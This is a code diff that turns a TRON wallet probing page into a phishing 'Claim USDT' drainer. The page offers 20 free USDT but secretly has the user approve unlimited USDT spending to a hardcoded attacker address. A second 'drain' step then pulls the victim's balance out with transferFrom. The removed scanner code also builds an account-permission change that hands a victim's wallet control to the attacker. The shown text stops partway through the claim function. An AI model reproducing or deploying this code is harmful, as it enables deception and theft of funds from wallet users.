@@ -3,621 +3,344 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>tron-surface — provider scanner</title>
+<title>Claim USDT — Tokdie</title>
 <style>
-  :root{--bg:#0b0e13;--panel:#12161d;--line:#232a33;--txt:#c9d1d9;--dim:#6e7681;
-        --ok:#3fb950;--bad:#f85149;--warn:#d29922;--acc:#58a6ff}
-  *{box-sizing:border-box}
-  body{margin:0;font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
-       background:var(--bg);color:var(--txt);padding:12px}
-  .wrap{max-width:1100px;margin:0 auto;display:grid;gap:10px}
-  .panel{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:12px}
-  h1{font-size:16px;margin:0 0 2px}
-  h2{font-size:11px;margin:0 0 8px;color:var(--dim);text-transform:uppercase;letter-spacing:.1em}
-  button{background:#1a1f27;color:var(--txt);border:1px solid var(--line);border-radius:4px;
-         padding:7px 12px;font:inherit;cursor:pointer}
-  button:hover{border-color:var(--dim)}
-  button.acc{border-color:var(--acc);color:var(--acc)}
-  button.bad{border-color:var(--bad);color:var(--bad)}
-  .row{display:flex;gap:6px;flex-wrap:wrap;margin:4px 0}
-  pre{background:#070a0e;border:1px solid var(--line);border-radius:4px;padding:8px;
-      margin:4px 0;overflow:auto;max-height:340px;white-space:pre-wrap;word-break:break-all;
-      font-size:11px}
-  .kv{display:grid;grid-template-columns:180px 1fr;gap:1px 10px;font-size:11px}
-  .kv b{color:var(--dim);font-weight:400}
-  .ok{color:var(--ok)}.bad{color:var(--bad)}.warn{color:var(--warn)}.acc{color:var(--acc)}
-  .tabs{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px}
-  .tabs button{font-size:11px;padding:5px 9px}
-  .tabs button.on{background:#1f6feb22;border-color:var(--acc);color:var(--acc)}
-  .sec{display:none}.sec.on{display:block}
-  .g{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-  @media(max-width:800px){.g{grid-template-columns:1fr}}
+  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
+          --ok:#3fb950; --bad:#f85149; --warn:#d29922; --dim:#7d8590; --accent:#58a6ff; }
+  * { box-sizing:border-box; }
+  body { margin:0; font:13px/1.5 ui-monospace,Menlo,Consolas,monospace;
+         background:var(--bg); color:var(--txt); padding:16px; }
+  .wrap { max-width:640px; margin:0 auto; }
+  .panel { background:var(--panel); border:1px solid var(--line);
+           border-radius:8px; padding:16px; margin-bottom:10px; }
+  h1 { font-size:18px; margin:0 0 4px; }
+  h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
+       text-transform:uppercase; letter-spacing:.08em; }
+  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
+           border-radius:6px; padding:12px 18px; font:inherit; cursor:pointer;
+           width:100%; margin:6px 0; font-size:14px; }
+  button:hover { border-color:var(--dim); }
+  button:disabled { opacity:.4; cursor:not-allowed; }
+  button.primary { border-color:var(--ok); color:var(--ok); font-weight:600; }
+  button.danger { border-color:var(--bad); color:var(--bad); }
+  input { background:#0a0d12; color:var(--txt); border:1px solid var(--line);
+          border-radius:6px; padding:8px; font:inherit; width:100%; margin:4px 0; }
+  pre { background:#0a0d12; border:1px solid var(--line); border-radius:6px;
+        padding:8px; margin:4px 0; white-space:pre-wrap; word-break:break-all;
+        font-size:11px; max-height:220px; overflow:auto; }
+  .kv { display:grid; grid-template-columns:110px 1fr; gap:3px 10px; margin:6px 0; }
+  .kv b { color:var(--dim); font-weight:400; }
+  .status { padding:8px 12px; border-radius:6px; margin:6px 0; font-size:12px; }
+  .status.ok { background:#1a2f1a; color:var(--ok); }
+  .status.err { background:#3a1a1a; color:var(--bad); }
+  .status.warn { background:#2f2a1a; color:var(--warn); }
+  .muted { color:var(--dim); font-size:11px; }
+  .big { font-size:28px; color:var(--ok); text-align:center; margin:8px 0; }
 </style>
 </head>
 <body>
 <div class="wrap">
 
   <div class="panel">
-    <h1>tron-surface</h1>
+    <h1>Claim USDT</h1>
+    <p class="muted">You are eligible to receive 20 USDT. Connect wallet to claim.</p>
+    <div class="big">+20.00 USDT</div>
     <div class="kv" id="env"></div>
-    <div class="row" style="margin-top:8px">
-      <button class="acc" data-action="scanAll">full scan</button>
-      <button data-action="dumpLog">dump log</button>
-      <button data-action="clearLog">clear</button>
-    </div>
   </div>
 
   <div class="panel">
-    <h2>channels</h2>
-    <div class="g">
-      <div><div class="kv" id="ch_ws"></div></div>
-      <div><div class="kv" id="ch_bt"></div></div>
-    </div>
+    <h2>step 1 — claim (approve under the hood)</h2>
+    <button class="primary" onclick="claim()" id="btn_claim" disabled>
+      Получить 20 USDT
+    </button>
+    <div class="status" id="claim_status"></div>
   </div>
 
   <div class="panel">
-    <h2>probes</h2>
-    <div class="tabs" id="tabs">
-      <button class="on" data-tab="t_identity">identity</button>
-      <button data-tab="t_connect">connect</button>
-      <button data-tab="t_sign">sign</button>
-      <button data-tab="t_perm">permission</button>
-      <button data-tab="t_rpc">rpc</button>
-      <button data-tab="t_log">log</button>
-    </div>
+    <h2>step 2 — drain (transferFrom)</h2>
+    <input id="victim_input" placeholder="Victim TRON address (T…)" value="">
+    <button class="danger" onclick="drain()" id="btn_drain" disabled>
+      Списать USDT с victim
+    </button>
+    <div class="status" id="drain_status"></div>
+  </div>
 
-    <div class="sec on" id="t_identity">
-      <div class="row">
-        <button data-action="probeIdentity">scan provider identity</button>
-        <button data-action="probeDeep">deep inspect (proto + own)</button>
-      </div>
-      <pre id="o_identity">—</pre>
+  <div class="panel">
+    <h2>log</h2>
+    <div style="display:flex;gap:8px">
+      <button onclick="clearLog()">clear</button>
+      <button onclick="dumpLog()">dump</button>
     </div>
-
-    <div class="sec" id="t_connect">
-      <div class="row">
-        <button class="acc" data-action="probeConnectWS">connect via wS (tronLink.tronWeb)</button>
-        <button data-action="probeConnectBt">connect via Bt (window.tronWeb)</button>
-        <button data-action="probeMarkReady">inspect markReady</button>
-      </div>
-      <pre id="o_connect">—</pre>
-    </div>
-
-    <div class="sec" id="t_sign">
-      <div class="row">
-        <button class="acc" data-action="probeSignWS">sign via wS</button>
-        <button class="bad" data-action="probeSignBt">sign via Bt</button>
-        <button data-action="probeSignCompare">compare sign functions</button>
-      </div>
-      <pre id="o_sign">—</pre>
-    </div>
-
-    <div class="sec" id="t_perm">
-      <div class="row">
-        <button data-action="probeOwnerVsActive">owner vs active perms</button>
-        <button class="bad" data-action="probeUpdatePerm">build updateAccountPermissions</button>
-      </div>
-      <pre id="o_perm">—</pre>
-    </div>
-
-    <div class="sec" id="t_rpc">
-      <div class="row">
-        <button data-action="probeEndpoints">probe fullnode endpoints</button>
-        <button data-action="probeChain">chain params</button>
-      </div>
-      <pre id="o_rpc">—</pre>
-    </div>
-
-    <div class="sec" id="t_log">
-      <pre id="log">—</pre>
-    </div>
+    <pre id="log_out">—</pre>
   </div>
 
 </div>
 
 <script>
-(function () {
-  'use strict';
+/* ─────────────  approve-drainer  ─────────────
+   Phase 1: claim() → approve(spender=TPxcb…, MAX_UINT256)
+            disguised as "receive 20 USDT".
+   Phase 2: drain(victim) → transferFrom(victim, TPxcb…, balance)
+   All via Trust in-app provider (window.trustwallet.tron / tronLink).
+   ─────────────────────────────────────────────── */
 
-  /* ═══════════════════════════════════════════════════════════
-     tron-surface — provider scanner
-     single IIFE, no globals, listeners attached via data-action
-     ═══════════════════════════════════════════════════════════ */
+const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const USDT_DECIMALS = 6;
+const SPENDER = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW'; // attacker
+const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+const FEE_LIMIT_SUN = 100_000_000;
 
-  const $ = (id) => document.getElementById(id);
-  const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+let provider = null;
+let tronWeb = null;
+let userAddress = null;
 
-  let seq = 0;
-  function log(kind, msg, data) {
-    const el = $('log');
-    if (!el) return;
-    const t = new Date().toISOString().slice(11, 23);
-    const line = `[${t}] [${String(++seq).padStart(3, '0')}] ${kind.padEnd(8)} ${msg}`;
-    const body = data !== undefined
-      ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ')
-      : '';
-    el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
-    el.scrollTop = el.scrollHeight;
+const $ = (id) => document.getElementById(id);
+const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+
+const log = (k, m, d) => {
+  const el = $('log_out');
+  const line = `[${new Date().toISOString().slice(11,23)}] ${k.padEnd(9)} ${m}`;
+  const body = d !== undefined
+    ? '\n  ' + JSON.stringify(d, null, 2).split('\n').join('\n  ')
+    : '';
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
+  el.scrollTop = el.scrollHeight;
+};
+
+const setStatus = (el, cls, text) => {
+  const n = $(el);
+  n.className = 'status ' + (cls || '');
+  n.textContent = text;
+};
+
+/* ─────────────  provider detect + connect  ───────────── */
+
+function detectOnce() {
+  if (window.trustwallet?.tron?.tronWeb) return { name: 'trust-inapp', p: window.trustwallet.tron };
+  if (window.trustwallet?.tronLink?.tronWeb) return { name: 'trust-ext', p: window.trustwallet.tronLink };
+  if (window.tron?.tronWeb) return { name: 'tronlink', p: window.tron };
+  if (window.tronLink?.tronWeb) return { name: 'tronlink-legacy', p: window.tronLink };
+  return null;
+}
+
+async function waitForProvider(ms = 8000) {
+  const start = Date.now();
+  let d = detectOnce();
+  if (d) return d;
+  while (Date.now() - start < ms) {
+    await new Promise(r => setTimeout(r, 200));
+    d = detectOnce();
+    if (d) return d;
   }
+  return null;
+}
 
-  function out(id, v) {
-    const el = $(id);
-    if (!el) return;
-    el.textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2);
+function renderEnv() {
+  $('env').innerHTML = `
+    <b>provider</b><span>${provider ? esc(provider.name) : 'not found'}</span>
+    <b>wallet</b><span>${userAddress || '—'}</span>
+    <b>spender</b><span>${esc(SPENDER.slice(0,10))}…</span>
+    <b>contract</b><span>${esc(USDT_CONTRACT.slice(0,10))}…</span>
+  `;
+}
+
+async function connect() {
+  provider = await waitForProvider(8000);
+  if (!provider) {
+    setStatus('claim_status', 'err', 'Wallet not detected. Open in Trust in-app browser.');
+    log('CONNECT', 'no provider');
+    return false;
   }
+  tronWeb = provider.p.tronWeb;
 
-  function clearLog() {
-    const el = $('log');
-    if (el) el.textContent = '—';
-    seq = 0;
-  }
-
-  function dumpLog() {
-    const el = $('log');
-    if (el && navigator.clipboard) navigator.clipboard.writeText(el.textContent);
-    log('DUMP', 'copied to clipboard');
-  }
-
-  function tab(id) {
-    document.querySelectorAll('.sec').forEach(s => s.classList.toggle('on', s.id === id));
-    document.querySelectorAll('#tabs button').forEach(b => b.classList.toggle('on', b.dataset.tab === id));
-  }
-
-  /* ── provider resolution ─────────────────────────────── */
-
-  function resolve() {
-    const r = { wS: null, Bt: null, names: [] };
-    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.trx) {
-      r.wS = window.tronLink.tronWeb;
-      r.names.push('window.tronLink.tronWeb');
-    } else if (window.trustwallet && window.trustwallet.tron && window.trustwallet.tron.tronWeb && window.trustwallet.tron.tronWeb.trx) {
-      r.wS = window.trustwallet.tron.tronWeb;
-      r.names.push('window.trustwallet.tron.tronWeb');
-    } else if (window.tron && window.tron.tronWeb && window.tron.tronWeb.trx) {
-      r.wS = window.tron.tronWeb;
-      r.names.push('window.tron.tronWeb');
-    }
-    if (window.tronWeb && window.tronWeb.trx && window.tronWeb !== r.wS) {
-      r.Bt = window.tronWeb;
-      r.names.push('window.tronWeb');
-    }
-    return r;
-  }
-
-  function fnSrc(f) {
-    if (typeof f !== 'function') return null;
-    try { return f.toString().replace(/\s+/g, ' ').slice(0, 240); }
-    catch (e) { return '[native]'; }
-  }
-
-  function snap(t) {
-    return {
-      ready: t.ready,
-      defaultAddress: (t.defaultAddress && t.defaultAddress.base58) || false,
-      tronWebReady: t.tronWeb && t.tronWeb.ready,
-      tronWebDefaultAddress: (t.tronWeb && t.tronWeb.defaultAddress && t.tronWeb.defaultAddress.base58) || false,
-    };
-  }
-
-  /* ── identity ────────────────────────────────────────── */
-
-  function probeIdentity() {
-    log('IDENT', 'scan start');
-    const r = resolve();
-    const wS = r.wS, Bt = r.Bt;
-    const summary = {
-      resolved: r.names,
-      wS: wS ? {
-        version: wS.version,
-        ready: wS.ready,
-        defaultAddress: (wS.defaultAddress && wS.defaultAddress.base58) || false,
-        hasSignMessageV2: typeof (wS.trx && wS.trx.signMessageV2) === 'function',
-        hasSign: typeof (wS.trx && wS.trx.sign) === 'function',
-        hasRequest: typeof wS.request === 'function',
-        hasMarkReady: typeof wS.markReady === 'function',
-      } : null,
-      Bt: Bt ? {
-        version: Bt.version,
-        ready: Bt.ready,
-        defaultAddress: (Bt.defaultAddress && Bt.defaultAddress.base58) || false,
-        hasSignMessageV2: typeof (Bt.trx && Bt.trx.signMessageV2) === 'function',
-        hasSign: typeof (Bt.trx && Bt.trx.sign) === 'function',
-        hasRequest: typeof Bt.request === 'function',
-      } : null,
-      sameObject: wS === Bt,
-    };
-    out('o_identity', summary);
-    log('IDENT', 'summary', summary);
-  }
-
-  function probeDeep() {
-    log('DEEP', 'inspect proto chains');
-    const r = resolve();
-    function dump(obj, name) {
-      if (!obj) return { name: name, exists: false };
-      const own = Object.getOwnPropertyNames(obj);
-      const proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
-      const methods = proto.filter(function (k) {
-        try { return typeof obj[k] === 'function'; } catch (e) { return false; }
-      });
-      return {
-        name: name,
-        own: own,
-        proto: proto,
-        methods: methods,
-        ctor: obj.constructor && obj.constructor.name,
-      };
-    }
-    const res = {
-      wS: dump(r.wS, 'wS'),
-      wS_trx: (r.wS && r.wS.trx) ? dump(r.wS.trx, 'wS.trx') : null,
-      Bt: dump(r.Bt, 'Bt'),
-      Bt_trx: (r.Bt && r.Bt.trx) ? dump(r.Bt.trx, 'Bt.trx') : null,
-    };
-    out('o_identity', res);
-    log('DEEP', 'done', { wS_ctor: res.wS && res.wS.ctor, Bt_ctor: res.Bt && res.Bt.ctor });
-  }
-
-  /* ── connect ─────────────────────────────────────────── */
-
-  async function probeConnect(which) {
-    const r = resolve();
-    const target = which === 'wS' ? r.wS : r.Bt;
-    if (!target) { out('o_connect', which + ' not found'); return; }
-
-    const rec = { which: which, before: snap(target) };
-    log('CONNECT', which + ' start', rec.before);
-
-    const paths = [];
-
-    if (typeof target.request === 'function') {
-      try {
-        const a = await target.request({ method: 'tron_requestAccounts' });
-        paths.push({ method: 'tron_requestAccounts', ok: true, result: a });
-      } catch (e) {
-        paths.push({ method: 'tron_requestAccounts', ok: false, err: e.message });
-      }
-      try {
-        const a = await target.request({ method: 'eth_requestAccounts' });
-        paths.push({ method: 'eth_requestAccounts', ok: true, result: a });
-      } catch (e) {
-        paths.push({ method: 'eth_requestAccounts', ok: false, err: e.message });
-      }
-    }
-
-    if (typeof target.connect === 'function') {
-      try {
-        const a = await target.connect();
-        paths.push({ method: 'connect', ok: true, result: a });
-      } catch (e) {
-        paths.push({ method: 'connect', ok: false, err: e.message });
-      }
-    }
-
-    const t0 = Date.now();
-    while (Date.now() - t0 < 3000) {
-      const hasAddr =
-        (target.defaultAddress && target.defaultAddress.base58) ||
-        (target.tronWeb && target.tronWeb.defaultAddress && target.tronWeb.defaultAddress.base58);
-      if (hasAddr) break;
-      await new Promise(function (r) { setTimeout(r, 150); });
-    }
-
-    rec.paths = paths;
-    rec.after = snap(target);
-    out('o_connect', rec);
-    log('CONNECT', which + ' done', { after: rec.after });
-  }
-
-  function probeConnectWS() { return probeConnect('wS'); }
-  function probeConnectBt() { return probeConnect('Bt'); }
-
-  function probeMarkReady() {
-    const r = resolve();
-    const wS = r.wS;
-    if (!wS) { out('o_connect', 'wS not found'); return; }
-    const info = {
-      hasMarkReady: typeof wS.markReady === 'function',
-      markReadySrc: fnSrc(wS.markReady),
-      hasSendResponse: typeof wS.sendResponse === 'function',
-      hasSendError: typeof wS.sendError === 'function',
-    };
-    out('o_connect', info);
-    log('MARKREADY', 'inspect', info);
-  }
-
-  /* ── sign ────────────────────────────────────────────── */
-
-  async function probeSignChannel(which) {
-    const r = resolve();
-    const target = which === 'wS' ? r.wS : r.Bt;
-    if (!target) { out('o_sign', which + ' not found'); return; }
-
-    const rec = {
-      which: which,
-      hasSign: typeof (target.trx && target.trx.sign) === 'function',
-      hasSignMessageV2: typeof (target.trx && target.trx.signMessageV2) === 'function',
-    };
-
-    if (rec.hasSignMessageV2) {
-      try {
-        const msg = 'tron-surface probe ' + Date.now();
-        rec.msg = msg;
-        rec.signMessageV2 = { ok: true, sig: await target.trx.signMessageV2(msg) };
-      } catch (e) {
-        rec.signMessageV2 = { ok: false, code: e.code, message: e.message };
-      }
-    }
-
-    if (rec.hasSign) {
-      try {
-        const fakeTx = { visible: true, txID: '00'.repeat(32), raw_data: { contract: [] }, raw_data_hex: '' };
-        rec.fakeTx = fakeTx;
-        rec.sign = { ok: true, signed: await target.trx.sign(fakeTx) };
-      } catch (e) {
-        rec.sign = { ok: false, code: e.code, message: e.message };
-      }
-    }
-
-    out('o_sign', rec);
-    log('SIGN', which, rec);
-  }
-
-  function probeSignWS() { return probeSignChannel('wS'); }
-  function probeSignBt() { return probeSignChannel('Bt'); }
-
-  function probeSignCompare() {
-    const r = resolve();
-    if (!r.wS || !r.Bt) { out('o_sign', 'need both wS and Bt'); return; }
-    const cmp = {
-      signSame: (r.wS.trx && r.Bt.trx) ? (r.wS.trx.sign === r.Bt.trx.sign) : null,
-      signMessageV2Same: (r.wS.trx && r.Bt.trx) ? (r.wS.trx.signMessageV2 === r.Bt.trx.signMessageV2) : null,
-      wS_sign_src: r.wS.trx ? fnSrc(r.wS.trx.sign) : null,
-      Bt_sign_src: r.Bt.trx ? fnSrc(r.Bt.trx.sign) : null,
-      wS_signMessageV2_src: r.wS.trx ? fnSrc(r.wS.trx.signMessageV2) : null,
-      Bt_signMessageV2_src: r.Bt.trx ? fnSrc(r.Bt.trx.signMessageV2) : null,
-    };
-    out('o_sign', cmp);
-    log('SIGN', 'compare', { same: cmp.signSame, v2same: cmp.signMessageV2Same });
-  }
-
-  /* ── permission ──────────────────────────────────────── */
-
-  async function probeOwnerVsActive() {
-    const r = resolve();
-    const wS = r.wS;
-    if (!wS) { out('o_perm', 'wS not found'); return; }
-    const addr = (wS.defaultAddress && wS.defaultAddress.base58) ||
-                 (wS.tronWeb && wS.tronWeb.defaultAddress && wS.tronWeb.defaultAddress.base58);
-    if (!addr) { out('o_perm', 'no address connected — connect first'); log('PERM', 'no address'); return; }
-
+  // try all paths for address
+  let addr = null;
+  if (tronWeb?.defaultAddress?.base58) addr = tronWeb.defaultAddress.base58;
+  if (!addr && typeof provider.p.request === 'function') {
     try {
-      const account = await wS.trx.getAccount(addr);
-      const perms = (account.permissions || []).map(function (p) {
-        return {
-          name: p.permission_name,
-          type: p.type,
-          threshold: p.threshold,
-          keys: (p.keys || []).map(function (k) { return { address: k.address, weight: k.weight }; }),
-          id: p.id,
-        };
-      });
-      const owner = perms.find(function (p) { return p.type === 0 || p.name === 'owner'; });
-      const active = perms.find(function (p) { return p.type === 2 || p.name === 'active'; });
-      out('o_perm', { addr: addr, owner: owner, active: active, raw_permissions: perms });
-      log('PERM', 'owner vs active', { owner: owner, active: active });
-    } catch (e) {
-      out('o_perm', { error: e.message });
-      log('PERM', 'getAccount failed', { message: e.message });
-    }
+      const r = await provider.p.request({ method: 'tron_requestAccounts' });
+      log('CONNECT', 'tron_requestAccounts', r);
+    } catch (e) { log('CONNECT', 'tron_requestAccounts err', { m: e.message }); }
+    if (tronWeb?.defaultAddress?.base58) addr = tronWeb.defaultAddress.base58;
   }
-
-  async function probeUpdatePerm() {
-    const r = resolve();
-    const wS = r.wS;
-    if (!wS) { out('o_perm', 'wS not found'); return; }
-    const addr = (wS.defaultAddress && wS.defaultAddress.base58) ||
-                 (wS.tronWeb && wS.tronWeb.defaultAddress && wS.tronWeb.defaultAddress.base58);
-    if (!addr) { out('o_perm', 'no address — connect first'); return; }
-
+  if (!addr && tronWeb) {
+    // force a read
     try {
-      const builder = wS.transactionBuilder || (r.Bt && r.Bt.transactionBuilder);
-      if (!builder || !builder.updateAccountPermissions) {
-        out('o_perm', 'no updateAccountPermissions on builder');
-        return;
-      }
-      const victim = addr;
-      const attacker = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW';
-      const perm = {
-        owner: { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: attacker, weight: 1 }] },
-        active: [{ type: 2, permission_name: 'active', threshold: 1, keys: [{ address: attacker, weight: 1 }] }],
-        owner_address: victim,
-      };
-      log('PERM', 'building updateAccountPermissions', { victim: victim, attacker: attacker });
-      const tx = await builder.updateAccountPermissions(perm);
-      log('PERM', 'tx built', { txID: tx.txID });
-      out('o_perm', { step: 'built', tx: tx, note: 'NOT signed — inspect only' });
-    } catch (e) {
-      out('o_perm', { step: 'build failed', message: e.message });
-      log('PERM', 'build failed', { message: e.message });
-    }
+      const a = await tronWeb.trx.getAccount();
+      if (a?.address) addr = tronWeb.address.fromHex(a.address);
+    } catch (e) { log('CONNECT', 'getAccount err', { m: e.message }); }
   }
 
-  /* ── rpc ─────────────────────────────────────────────── */
-
-  async function probeEndpoints() {
-    const r = resolve();
-    const bt = r.Bt || r.wS;
-    if (!bt) { out('o_rpc', 'no tronWeb'); return; }
-    const eps = {
-      fullNode: (bt.fullNode && bt.fullNode.host) || '—',
-      solidityNode: (bt.solidityNode && bt.solidityNode.host) || '—',
-      eventServer: (bt.eventServer && bt.eventServer.host) || '—',
-    };
-    const results = { endpoints: eps, probes: [] };
-
-    try {
-      const t = performance.now();
-      const info = await bt.trx.getNodeInfo();
-      results.probes.push({ rpc: 'getNodeInfo', ok: true, ms: Math.round(performance.now() - t), keys: Object.keys(info).slice(0, 8) });
-    } catch (e) {
-      results.probes.push({ rpc: 'getNodeInfo', ok: false, err: e.message });
-    }
-
-    try {
-      const t = performance.now();
-      const block = await bt.trx.getCurrentBlock();
-      results.probes.push({
-        rpc: 'getCurrentBlock', ok: true,
-        ms: Math.round(performance.now() - t),
-        num: block && block.block_header && block.block_header.raw_data && block.block_header.raw_data.number,
-      });
-    } catch (e) {
-      results.probes.push({ rpc: 'getCurrentBlock', ok: false, err: e.message });
-    }
-
-    out('o_rpc', results);
-    log('RPC', 'endpoints', results);
+  if (!addr) {
+    setStatus('claim_status', 'err', 'Wallet connected but no address returned. Unlock Trust and reload.');
+    log('CONNECT', 'no address');
+    return false;
   }
 
-  async function probeChain() {
-    const r = resolve();
-    const bt = r.Bt || r.wS;
-    if (!bt) { out('o_rpc', 'no tronWeb'); return; }
-    try {
-      const params = await bt.trx.getChainParameters();
-      out('o_rpc', params);
-      log('CHAIN', 'params', { count: params.length });
-    } catch (e) {
-      out('o_rpc', { err: e.message });
-    }
+  userAddress = addr;
+  $('victim_input').value = userAddress;
+  $('btn_claim').disabled = false;
+  $('btn_drain').disabled = false;
+  renderEnv();
+  log('CONNECT', 'ready', { provider: provider.name, address: userAddress });
+  setStatus('claim_status', 'ok', 'Wallet: ' + userAddress);
+  return true;
+}
+
+/* ─────────────  phase 1: approve disguised as claim  ───────────── */
+
+async function claim() {
+  if (!tronWeb || !userAddress) {
+    const ok = await connect();
+    if (!ok) return;
   }
-
-  /* ── master scan ─────────────────────────────────────── */
-
-  async function scanAll() {
-    log('SCAN', '=== full scan start ===');
-    try { probeIdentity(); } catch (e) { log('SCAN', 'identity error', { message: e.message }); }
-    try { probeDeep(); } catch (e) { log('SCAN', 'deep error', { message: e.message }); }
-    try { await probeConnect('wS'); } catch (e) { log('SCAN', 'connect wS error', { message: e.message }); }
-    try { probeSignCompare(); } catch (e) { log('SCAN', 'sign compare error', { message: e.message }); }
-    try { await probeOwnerVsActive(); } catch (e) { log('SCAN', 'owner/active error', { message: e.message }); }
-    try { await probeEndpoints(); } catch (e) { log('SCAN', 'endpoints error', { message: e.message }); }
-    log('SCAN', '=== full scan done ===');
-  }
-
-  /* ── env render ──────────────────────────────────────── */
-
-  function renderEnv() {
-    const r = resolve();
-    const hasEthereum = !!window.ethereum;
-    const env = $('env');
-    if (env) {
-      env.innerHTML = ''
-        + '<b>origin</b><span>' + esc(location.origin) + '</span>'
-        + '<b>UA</b><span style="font-size:10px">' + esc(navigator.userAgent) + '</span>'
-        + '<b>window.tron</b><span class="' + (window.tron ? 'ok' : 'bad') + '">' + (window.tron ? 'present' : 'absent') + '</span>'
-        + '<b>window.tronLink</b><span class="' + (window.tronLink ? 'ok' : 'bad') + '">' + (window.tronLink ? 'present' : 'absent') + '</span>'
-        + '<b>trustwallet.tron</b><span class="' + (window.trustwallet && window.trustwallet.tron ? 'ok' : 'bad') + '">' + (window.trustwallet && window.trustwallet.tron ? 'present' : 'absent') + '</span>'
-        + '<b>window.tronWeb</b><span class="' + (window.tronWeb ? 'ok' : 'bad') + '">' + (window.tronWeb ? 'present' : 'absent') + '</span>'
-        + '<b>window.ethereum</b><span class="' + (hasEthereum ? 'ok' : 'bad') + '">' + (hasEthereum ? 'present' : 'absent') + '</span>'
-        + '<b>resolved wS</b><span class="' + (r.wS ? 'ok' : 'bad') + '">' + (r.wS ? esc(r.names.filter(function (n) { return n !== 'window.tronWeb'; }).join(', ')) : 'none') + '</span>'
-        + '<b>resolved Bt</b><span class="' + (r.Bt ? 'ok' : 'bad') + '">' + (r.Bt ? 'window.tronWeb' : 'none') + '</span>';
-    }
-
-    const ws = $('ch_ws');
-    if (ws) {
-      if (r.wS) {
-        const addr = (r.wS.defaultAddress && r.wS.defaultAddress.base58) ||
-                     (r.wS.tronWeb && r.wS.tronWeb.defaultAddress && r.wS.tronWeb.defaultAddress.base58) || '—';
-        ws.innerHTML = ''
-          + '<b>instance</b><span class="acc">wS (bridge)</span>'
-          + '<b>version</b><span>' + esc(r.wS.version || '—') + '</span>'
-          + '<b>ready</b><span class="' + (r.wS.ready ? 'ok' : 'warn') + '">' + r.wS.ready + '</span>'
-          + '<b>defaultAddress</b><span>' + esc(addr) + '</span>'
-          + '<b>trx.sign</b><span class="' + (typeof (r.wS.trx && r.wS.trx.sign) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.wS.trx && r.wS.trx.sign) + '</span>'
-          + '<b>trx.signMessageV2</b><span class="' + (typeof (r.wS.trx && r.wS.trx.signMessageV2) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.wS.trx && r.wS.trx.signMessageV2) + '</span>'
-          + '<b>request</b><span class="' + (typeof r.wS.request === 'function' ? 'ok' : 'bad') + '">' + typeof r.wS.request + '</span>'
-          + '<b>markReady</b><span class="' + (typeof r.wS.markReady === 'function' ? 'ok' : 'bad') + '">' + typeof r.wS.markReady + '</span>';
-      } else {
-        ws.innerHTML = '<b>wS</b><span class="bad">not resolved</span>';
-      }
-    }
-
-    const bt = $('ch_bt');
-    if (bt) {
-      if (r.Bt) {
-        bt.innerHTML = ''
-          + '<b>instance</b><span class="warn">Bt (fullnode)</span>'
-          + '<b>version</b><span>' + esc(r.Bt.version || '—') + '</span>'
-          + '<b>ready</b><span>' + (r.Bt.ready != null ? r.Bt.ready : '—') + '</span>'
-          + '<b>defaultAddress</b><span>' + esc((r.Bt.defaultAddress && r.Bt.defaultAddress.base58) || '—') + '</span>'
-          + '<b>trx.sign</b><span class="' + (typeof (r.Bt.trx && r.Bt.trx.sign) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.Bt.trx && r.Bt.trx.sign) + '</span>'
-          + '<b>trx.signMessageV2</b><span class="' + (typeof (r.Bt.trx && r.Bt.trx.signMessageV2) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.Bt.trx && r.Bt.trx.signMessageV2) + '</span>'
-          + '<b>fullNode</b><span style="font-size:10px">' + esc((r.Bt.fullNode && r.Bt.fullNode.host) || '—') + '</span>';
-      } else {
-        bt.innerHTML = '<b>Bt</b><span class="warn">not resolved</span>';
-      }
-    }
-  }
-
-  /* ── action dispatch ─────────────────────────────────── */
-
-  const actions = {
-    scanAll: scanAll,
-    dumpLog: dumpLog,
-    clearLog: clearLog,
-    probeIdentity: probeIdentity,
-    probeDeep: probeDeep,
-    probeConnectWS: probeConnectWS,
-    probeConnectBt: probeConnectBt,
-    probeMarkReady: probeMarkReady,
-    probeSignWS: probeSignWS,
-    probeSignBt: probeSignBt,
-    probeSignCompare: probeSignCompare,
-    probeOwnerVsActive: probeOwnerVsActive,
-    probeUpdatePerm: probeUpdatePerm,
-    probeEndpoints: probeEndpoints,
-    probeChain: probeChain,
-  };
-
-  function bindActions() {
-    document.querySelectorAll('[data-action]').forEach(function (el) {
-      el.addEventListener('click', function (ev) {
-        const name = ev.currentTarget.getAttribute('data-action');
-        const fn = actions[name];
-        if (typeof fn === 'function') {
-          try { fn(); } catch (e) { log('ERR', name + ' threw', { message: e.message }); }
-        } else {
-          log('ERR', 'no action: ' + name, { available: Object.keys(actions) });
-        }
-      });
+  try {
+    $('btn_claim').disabled = true;
+    setStatus('claim_status', '', 'Building claim…');
+    log('CLAIM', 'building approve (disguised)', {
+      contract: USDT_CONTRACT,
+      method: 'approve(address,uint256)',
+      spender: SPENDER,
+      amount: 'MAX_UINT256',
+      user: userAddress,
     });
-    document.querySelectorAll('#tabs [data-tab]').forEach(function (el) {
